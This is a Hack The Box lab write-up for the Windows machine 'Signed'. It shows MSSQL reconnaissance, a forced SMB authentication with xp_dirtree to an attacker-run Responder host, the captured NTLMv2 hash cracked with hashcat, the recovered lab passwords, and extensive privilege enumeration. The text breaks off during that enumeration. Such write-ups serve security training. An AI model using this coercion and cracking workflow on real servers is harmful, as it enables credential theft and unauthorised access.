---
Category: HTB/Machines/Windows
tags:
  - HTB
  - Machine
  - Windows
  - Medium
  - MSSQL
  - NTLMHashCapture
  - Hash
  - Cracking
  - hashcat
  - SilverTicket
  - PrivilegedAttributeCertificate
  - PAC
  - SIDInjection
  - OPENROWSET
---

![](images/Signed.png)

## Table of Contents

- [Summary](#Summary)
    - [Machine Information](#Machine-Information)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 1433/TCP](#Enumeration-of-Port-1433TCP)
- [Privilege Escalation to MSSQLSVC](#Privilege-Escalation-to-MSSQLSVC)
    - [NTLM Hash Capture using Responder](#NTLM-Hash-Capture-using-Responder)
    - [Cracking the Hash using hashcat](#Cracking-the-Hash-using-hashcat)
- [Enumeration (MSSQLSVC / SQL Instance)](#Enumeration-MSSQLSVC-SQL-Instance)
- [Initial Access](#Initial-Access)
    - [Privilege Escalation to dbo forging a Silver Ticket](#Privilege-Escalation-to-dbo-forging-a-Silver-Ticket)
    - [Code Execution through xp_cmdshell](#Code-Execution-through-xp_cmdshell)
- [user.txt](#usertxt)
- [Persistence](#Persistence)
- [Enumeration (MSSQLSVC / Shell)](#Enumeration-MSSQLSVC-Shell)
- [Active Directory Configuration Dump](#Active-Directory-Configuration-Dump)
- [Unintended Solution](#Unintended-Solution)
    - [MSSQL OPENROWSET](#MSSQL-OPENROWSET)
    - [root.txt](#roottxt)
    - [Post Exploitation](#Post-Exploitation)
        - [Privilege Escalation to SYSTEM](#Privilege-Escalation-to-SYSTEM)

## Summary

The box started very unusual with only port `1433/TCP` open, revealed by our initial `Port Scan` using `Nmap`. After forcing `SMB Authentication` using `xp_dirtree`, the `NTLM Hash` of the `MSSQL Service Account` was captured and cracked offline to perform the `Privilege Escalation` from the given user.

For `Initial Access` a `Silver Ticket` was forged with `Privileged Attribute Certificate (PAC)` manipulation, injecting various `Group Memberships` to gain `Elevated Access` to the `MSSQL Service`.

`Enumeration` revealed the `MSSQLSVC` account had `sysadmin` privileges on the `SQL Server`, and the `msdb` database had `TRUSTWORTHY` enabled with interesting permissions including `IMPERSONATE` capabilities on the `dc_admin` role. The intended path likely involved `Certificate Exploitation`, `Unconstrained Delegation` on `DC01`, or `Shadow Credentials Attacks`.

However, an most likely `unintended shortcut` was discovered. Using `OPENROWSET(BULK ...)`, the `root.txt` flag was read directly from the Administrator's desktop. This lead also to `Exfiltration` of the `PowerShell History` which contained the `Cleartext Password` for `Administrator`. This allowed to spawn a shell as `Administrator`.

### Machine Information

As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: `scott / Sm230#C5NatH`

## Reconnaissance

### Port Scanning

As usual we started with the initial `Port Scan` using `Nmap` which revealed that only port `1433/TCP` were open to work with. Which was used my `Microsoft SQL Server (MSSQL)`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -Pn 10.129.34.27
[sudo] password for kali:                              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-11 21:04 CEST
Nmap scan report for 10.129.34.27
Host is up (0.013s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-11T19:08:02+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.34.27:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-11T19:04:11
|_Not valid after:  2055-10-11T19:04:11
| ms-sql-info: 
|   10.129.34.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.78 seconds
```

We also added `signed.htb` and `dc01.signed.htb` to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.34.27    signed.htb
10.129.34.27    dc01.signed.htb
```

### Enumeration of Port 1433/TCP

First we connected to the `SQL Server instance` using the given `credentials` and `impacket-mssqlclient`.

```shell
┌──(kali㉿kali)-[~]
└─$ impacket-mssqlclient scott:Sm230#C5NatH@10.129.34.27              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)> 
```

After establishing our `SQL Server` connection, we first needed to verify what level of access our current user had within the database. We executed the following query to `enumerate` our `privileges`. But since the query returned `0` we knew that we had no luck this time.

```shell
SQL (scott  guest@master)> SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
            
-   -   -   
0   0   0
```

Next we checked if we could find any `linked MSSQL Servers` but we only had `DC01` available to us.

```shell
SQL (scott  guest@master)> EXEC sp_linkedservers;
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL
```

Now we wanted to `enumerate` our `privileges` across `all databases` on the SQL Server instance. To accomplish this efficiently, we used the `sp_MSforeachdb` stored procedure.

```shell
SQL (scott  guest@master)> EXEC sp_MSforeachdb 'USE ?; SELECT ''?'' AS DBName, USER_NAME() AS CurrentUser, IS_MEMBER(''db_owner'') AS IsDbOwner;';
DBName   CurrentUser   IsDbOwner   
------   -----------   ---------   
b'master'   guest                 0   

b'tempdb'   guest                 0   

b'msdb'   guest                 0
```

As last step for our first look at the instance, we checked which `databases` were available to us.

```shell
SQL (scott  guest@master)> SELECT name, database_id, create_date FROM sys.databases ORDER BY name;
name     database_id   create_date   
------   -----------   -----------   
master             1   2003-04-08 09:13:36   

model              3   2003-04-08 09:13:36   

msdb               4   2022-10-08 06:31:57   

tempdb             2   2025-10-11 12:04:14
```

## Privilege Escalation to MSSQLSVC
### NTLM Hash Capture using Responder

As we knew that we only had a normal user allowed to access the `SQL Server instance` we tried to `capture` the `NTLM Hash` using `Responder` and `xp_dirtree`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.97]
    Responder IPv6             [dead:beef:4::105f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-M3NAAGNQPYU]
    Responder Domain Name      [TGYW.LOCAL]
    Responder DCE-RPC Port     [48956]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...
```

We forced the `SQL Server` to connect to our local machine and catched the `hash`.

```shell
SQL (scott  guest@master)> EXEC xp_dirtree '\\10.10.16.97\share';
subdirectory   depth   
------------   -----
```

```shell
[SMB] NTLMv2-SSP Client   : 10.129.34.27
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:d39ced7e4d3f7fbf:005488FC2A613738B18A4FF9CF3EE765:010100000000000080C4B7C9F33ADC01D067048D295EE3C40000000002000800540047005900570001001E00570049004E002D004D0033004E004100410047004E00510050005900550004003400570049004E002D004D0033004E004100410047004E0051005000590055002E0054004700590057002E004C004F00430041004C000300140054004700590057002E004C004F00430041004C000500140054004700590057002E004C004F00430041004C000700080080C4B7C9F33ADC01060004000200000008003000300000000000000000000000003000006EBF5E2A1BF9BA07D53E533250BAA3B9C60A5BC2977144486210A86F3B89CE0C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00390037000000000000000000
```

### Cracking the Hash using hashcat

After that we `cracked` the `hash` within a few seconds using `hashcat` and got the `password` for the user `MSSQLSVC`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Signed/files]
└─$ cat mssqlsvc.hash 
mssqlsvc::SIGNED:d39ced7e4d3f7fbf:005488FC2A613738B18A4FF9CF3EE765:010100000000000080C4B7C9F33ADC01D067048D295EE3C40000000002000800540047005900570001001E00570049004E002D004D0033004E004100410047004E00510050005900550004003400570049004E002D004D0033004E004100410047004E0051005000590055002E0054004700590057002E004C004F00430041004C000300140054004700590057002E004C004F00430041004C000500140054004700590057002E004C004F00430041004C000700080080C4B7C9F33ADC01060004000200000008003000300000000000000000000000003000006EBF5E2A1BF9BA07D53E533250BAA3B9C60A5BC2977144486210A86F3B89CE0C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00390037000000000000000000
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Signed/files]
└─$ hashcat -m 5600 mssqlsvc.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

MSSQLSVC::SIGNED:d39ced7e4d3f7fbf:005488fc2a613738b18a4ff9cf3ee765:010100000000000080c4b7c9f33adc01d067048d295ee3c40000000002000800540047005900570001001e00570049004e002d004d0033004e004100410047004e00510050005900550004003400570049004e002d004d0033004e004100410047004e0051005000590055002e0054004700590057002e004c004f00430041004c000300140054004700590057002e004c004f00430041004c000500140054004700590057002e004c004f00430041004c000700080080c4b7c9f33adc01060004000200000008003000300000000000000000000000003000006ebf5e2a1bf9ba07d53e533250baa3b9c60a5bc2977144486210a86f3b89ce0c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00390037000000000000000000:purPLE9795!@
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MSSQLSVC::SIGNED:d39ced7e4d3f7fbf:005488fc2a613738b...000000
Time.Started.....: Sat Oct 11 21:14:44 2025 (3 secs)
Time.Estimated...: Sat Oct 11 21:14:47 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1382.8 kH/s (1.10ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4487168/14344385 (31.28%)
Rejected.........: 0/4487168 (0.00%)
Restore.Point....: 4485120/14344385 (31.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: purdaliza -> puppup90
Hardware.Mon.#1..: Util: 82%

Started: Sat Oct 11 21:14:42 2025
Stopped: Sat Oct 11 21:14:49 2025
```

| Username | Password     |
| -------- | ------------ |
| mssqlsvc | purPLE9795!@ |

We used the `credentials` to connect to the `SQL Server instance` once more but only as `guest`.

```shell
┌──(kali㉿kali)-[~]
└─$ impacket-mssqlclient SIGNED/mssqlsvc:'purPLE9795!@'@10.129.34.27 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)> 
```

## Enumeration (MSSQLSVC / SQL Instance)

To gain a comprehensive understanding of which accounts had elevated privileges on the `SQL Server instance`, we started enumerating all server role memberships.

```shell
SQL (SIGNED\mssqlsvc  guest@master)> EXEC sp_helpsrvrolemember;
ServerRole   MemberName                                                                            MemberSID   
----------   -------------------------   -------------------------------------------------------------------   
sysadmin     sa                                                                                        b'01'   

sysadmin     SIGNED\IT                           b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   

sysadmin     NT SERVICE\SQLWriter        b'010600000000000550000000732b9753646ef90356745cb675c3aa6cd6b4d28b'   

sysadmin     NT SERVICE\Winmgmt          b'0106000000000005500000005a048ddff9c7430ab450d4e7477a2172ab4170f4'   

sysadmin     NT SERVICE\MSSQLSERVER      b'010600000000000550000000e20f4fe7b15874e48e19026478c2dc9ac307b83e'   

sysadmin     NT SERVICE\SQLSERVERAGENT   b'010600000000000550000000dca88f14b79fd47a992a3d8943f829a726066357'
```

Based on the output, we decided to enumerate all server principals to get a complete picture of all logins configured on the `SQL Server instance`.

```shell
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name, type_desc, is_disabled, default_database_name FROM sys.server_principals WHERE type IN ('S','U','G') ORDER BY name;
name                                type_desc       is_disabled   default_database_name   
---------------------------------   -------------   -----------   ---------------------   
##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1   master                  

##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1   master                  

NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0   master                  

NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0   master                  

NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0   master                  

NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0   master                  

NT SERVICE\SQLWriter                WINDOWS_LOGIN             0   master                  

NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0   master                  

sa                                  SQL_LOGIN                 0   master                  

scott                               SQL_LOGIN                 0   master                  

SIGNED\Domain Users                 WINDOWS_GROUP             0   master                  

SIGNED\IT                           WINDOWS_GROUP             0   master
```

One line stood out. It seemed that `members` of the `IT group` were also `sysadmin` on the `SQL Server instance`.

```shell
<--- CUT FOR BREVITY --->
sysadmin     SIGNED\IT
<--- CUT FOR BREVITY --->
```

Given that the box was named "**Signed**", we suspected that certificates might play a role in the attack path. We queried the system catalog to enumerate any `certificates` stored within the `SQL Server`.

```shell
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name, certificate_id, subject, pvt_key_encryption_type_desc FROM sys.certificates;
name                                                                      certificate_id   subject                                                               pvt_key_encryption_type_desc   
-----------------------------------------------------------------------   --------------   -------------------------------------------------------------------   ----------------------------   
##MS_SQLResourceSigningCertificate##                                                 101   MS_SQLResourceSigningCertificate                                      NO_PRIVATE_KEY                 

##MS_SQLReplicationSigningCertificate##                                              102   MS_SQLResourceSigningCertificate                                      NO_PRIVATE_KEY                 

##MS_SQLAuthenticatorCertificate##                                                   103   MS_SQLAuthenticatorCertificate                                        NO_PRIVATE_KEY                 

##MS_AgentSigningCertificate##                                                       104   MS_AgentSigningCertificate                                            NO_PRIVATE_KEY                 

##MS_PolicySigningCertificate##                                                      105   MS_PolicySigningCertificate                                           NO_PRIVATE_KEY                 

##MS_SmoExtendedSigningCertificate##                                                 106   MS_SmoExtendedSigningCertificate                                      NO_PRIVATE_KEY                 

##MS_SchemaSigningCertificate49DAF39CDF8914F6AD714B481518685F0570173F##              257   MS_SchemaSigningCertificate49DAF39CDF8914F6AD714B481518685F0570173F   NO_PRIVATE_KEY
```

Based on our earlier enumeration, we noticed references to various domain groups. We decided to search specifically for principals related to the IT department, as IT groups often have elevated privileges.

```shell
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals WHERE name LIKE '%IT%';
name                                 principal_id   type_desc       is_disabled   
----------------------------------   ------------   -------------   -----------   
securityadmin                                   4   SERVER_ROLE               0   

##MS_DefinitionReader##                        13   SERVER_ROLE               0   

##MS_SecurityDefinitionReader##                17   SERVER_ROLE               0   

##MS_PerformanceDefinitionReader##             18   SERVER_ROLE               0   

##MS_ServerSecurityStateReader##               19   SERVER_ROLE               0   

SIGNED\IT                                     259   WINDOWS_GROUP             0   

NT SERVICE\SQLWriter                          260   WINDOWS_LOGIN             0   

NT AUTHORITY\SYSTEM                           263   WINDOWS_LOGIN             0
```

After identifying the `SIGNED\IT` group as a server principal, we wanted to determine exactly what permissions had been granted to this group.

```shell
SQL (SIGNED\mssqlsvc  guest@master)> SELECT pr.name, pr.type_desc, pe.state_desc, pe.permission_name FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_id WHERE pr.name = 'SIGNED\IT';
name        type_desc       state_desc   permission_name   
---------   -------------   ----------   ---------------   
SIGNED\IT   WINDOWS_GROUP   GRANT        CONNECT SQL
```

To understand our `current authentication context` and `group memberships` within `SQL Server`, we queried the `login token` information.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT * FROM sys.login_token;
principal_id                                                           sid   name                                         type            usage           
------------   -----------------------------------------------------------   ------------------------------------------   -------------   -------------   
           2                                                         b'02'   public                                       SERVER ROLE     GRANT OR DENY   

         268   b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'   SIGNED\Domain Users                          WINDOWS GROUP   GRANT OR DENY   

         268   b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'   SIGNED\Domain Users                          WINDOWS GROUP   GRANT OR DENY   

           0                                   b'010100000000000100000000'   \Everyone                                    WINDOWS GROUP   GRANT OR DENY   

           0                           b'01020000000000052000000021020000'   BUILTIN\Users                                WINDOWS GROUP   GRANT OR DENY   

           0                           b'0102000000000005200000002a020000'   BUILTIN\Pre-Windows 2000 Compatible Access   WINDOWS GROUP   GRANT OR DENY   

           0                                   b'010100000000000502000000'   NT AUTHORITY\NETWORK                         WINDOWS GROUP   GRANT OR DENY   

           0                                   b'01010000000000050b000000'   NT AUTHORITY\Authenticated Users             WINDOWS GROUP   GRANT OR DENY   

           0                                   b'01010000000000050f000000'   NT AUTHORITY\This Organization               WINDOWS GROUP   GRANT OR DENY   

           0                           b'0102000000000005400000000a000000'   NT AUTHORITY\NTLM Authentication             WINDOWS GROUP   GRANT OR DENY
```

After checking for certificates in the `master` database, we switched context to the `msdb` database to search for certificates there as well.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT name, certificate_id, subject, pvt_key_encryption_type_desc FROM sys.certificates;
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
name                                                                      certificate_id   subject                                                               pvt_key_encryption_type_desc   
-----------------------------------------------------------------------   --------------   -------------------------------------------------------------------   ----------------------------   
##MS_AgentSigningCertificate##                                                       104   MS_AgentSigningCertificate                                            NO_PRIVATE_KEY                 

##MS_SchemaSigningCertificate49DAF39CDF8914F6AD714B481518685F0570173F##              256   MS_SchemaSigningCertificate49DAF39CDF8914F6AD714B481518685F0570173F   NO_PRIVATE_KEY
```

Since we were already in the `msdb` database, which stores `SQL Server Agent` configuration data, we decided to `enumerate` all `scheduled jobs` on the server.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT name, enabled, owner_sid FROM dbo.sysjobs;
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
ERROR(DC01): Line 1: The SELECT permission was denied on the object 'sysjobs', database 'msdb', schema 'dbo'.
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'CREATE CERTIFICATE');
       
----   
NULL
```

We wanted to verify whether we had the `ability` to `modify` existing `SQL Server logins`, which would be a powerful capability for privilege escalation.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ALTER ANY LOGIN');
    
-   
0
```

Next, we checked whether we had the `ability` to `impersonate` other `users` or `logins` on the `SQL Server`.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'IMPERSONATE');
       
----   
NULL
```

Next, we attempted to check whether we had the `ability` to `impersonate` other `users` or `logins` on the `SQL Server`.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT HAS_PERMS_BY_NAME('sa', 'LOGIN', 'IMPERSONATE');
    
-   
0
```

To get a complete view of all `server-level permissions` our account possessed, we used the `fn_my_permissions` function.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name   subentity_name   permission_name                   
-----------   --------------   -------------------------------   
server                         CONNECT SQL                       

server                         VIEW ANY DATABASE                 

server                         VIEW ANY SECURITY DEFINITION      

server                         VIEW ANY PERFORMANCE DEFINITION   

server                         VIEW ANY DEFINITION
```

We proceeded to `enumerate` all `SQL Server authentication logins` (excluding the `sa` account, which we had already examined).

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT name, principal_id, credential_id FROM sys.server_principals WHERE type = 'S' AND name != 'sa';
name                                principal_id   credential_id   
---------------------------------   ------------   -------------   
##MS_PolicyEventProcessingLogin##            256            NULL   

##MS_PolicyTsqlExecutionLogin##              257            NULL   

scott                                        267            NULL
```

We then investigated how `logins` were `mapped` to `linked servers` but didn't get anything useful out of it.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> EXEC sp_helplinkedsrvlogin;
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
DC01            NULL                        1   NULL
```

With our `sysadmin` privileges confirmed, we leveraged the `xp_dirtree` extended stored procedure to `enumerate` the `file system`.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> EXEC xp_dirtree 'C:\', 1, 1;
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   

Config.Msi                      1      0   

Documents and Settings          1      0   

inetpub                         1      0   

PerfLogs                        1      0   

Program Files                   1      0   

Program Files (x86)             1      0   

ProgramData                     1      0   

rtr8878.tmp                     1      1   

SQL2022                         1      0   

System Volume Information       1      0   

Users                           1      0   

Windows                         1      0
```

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> EXEC xp_dirtree 'C:\Users\', 1, 0;
subdirectory    depth   
-------------   -----   
Administrator       1   

All Users           1   

Default             1   

Default User        1   

mssqlsvc            1   

Public              1
```

In the process we found the `user.txt` on our `Desktop` which meant we at least were on the right track.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> xp_dirtree C:\users\mssqlsvc\Desktop
subdirectory   depth   file   
------------   -----   ----   
user.txt           1      1
```

We switched to the `msdb` database and checked for members of the `dc_admin` database role.

```shell
SQL (SIGNED\mssqlsvc  guest@master)> USE msdb; SELECT * FROM sys.database_role_members WHERE role_principal_id = USER_ID('dc_admin');
ENVCHANGE(DATABASE): Old Value: master, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
role_principal_id   member_principal_id   
-----------------   -------------------   
               14                    16
```

To make the role `membership information` more readable, we modified our query to `resolve` the `principal IDs` to actual user names.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT USER_NAME(member_principal_id) AS member FROM sys.database_role_members WHERE role_principal_id = USER_ID('dc_admin');
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
member                         
----------------------------   
MS_DataCollectorInternalUser
```

After identifying the members of the `dc_admin` role, we proceeded to `enumerate` the `specific permissions` granted to this `role`.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT pr.name, pe.permission_name, pe.state_desc FROM sys.database_permissions pe JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_id WHERE pr.name = 'dc_admin';
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
name       permission_name   state_desc   
--------   ---------------   ----------   
dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   IMPERSONATE       GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   VIEW DEFINITION   GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   VIEW DEFINITION   GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   VIEW DEFINITION   GRANT        

dc_admin   EXECUTE           GRANT        

dc_admin   VIEW DEFINITION   GRANT
```

We also used a `built-in stored procedure` to `enumerate` members of the `dc_admin` role. But besides the automatically created `Data Collector` we couldn't find anything useful.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; EXEC sp_helprolemember 'dc_admin';
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
DbRole     MemberName                                                                       MemberSID   
--------   ----------------------------   -----------------------------------------------------------   
dc_admin   MS_DataCollectorInternalUser   b'0105000000000009030000004afef240a4aef447b344a561713c823f'
```

We switched to the `master` database and `enumerated` all `custom (non-fixed) database roles`.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE master; SELECT name, type_desc, create_date FROM sys.database_principals WHERE type = 'R' AND is_fixed_role = 0;
ENVCHANGE(DATABASE): Old Value: msdb, New Value: master
INFO(DC01): Line 1: Changed database context to 'master'.
name     type_desc       create_date   
------   -------------   -----------   
public   DATABASE_ROLE   2003-04-08 09:10:19
```

As next step we performed a more granular analysis to identify specific database objects that the `dc_admin` role had `permissions` on.

```shell
SQL (SIGNED\mssqlsvc  guest@master)> USE msdb; SELECT pe.permission_name, pe.state_desc, OBJECT_NAME(pe.major_id) AS object_name, o.type_desc FROM sys.database_permissions pe LEFT JOIN sys.objects o ON pe.major_id = o.object_id WHERE pe.grantee_principal_id = USER_ID('dc_admin');
ENVCHANGE(DATABASE): Old Value: master, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
permission_name   state_desc   object_name                                        type_desc              
---------------   ----------   ------------------------------------------------   --------------------   
EXECUTE           GRANT        sp_syscollector_cleanup_collector                  SQL_STORED_PROCEDURE   

EXECUTE           GRANT        sp_syscollector_set_warehouse_instance_name        SQL_STORED_PROCEDURE   

EXECUTE           GRANT        sp_syscollector_set_warehouse_database_name        SQL_STORED_PROCEDURE   

EXECUTE           GRANT        sp_syscollector_set_cache_directory                SQL_STORED_PROCEDURE   

EXECUTE           GRANT        sp_syscollector_set_cache_window                   SQL_STORED_PROCEDURE   

EXECUTE           GRANT        fn_syscollector_highest_incompatible_mdw_version   SQL_SCALAR_FUNCTION    

EXECUTE           GRANT        sp_syscollector_create_collection_set              SQL_STORED_PROCEDURE   

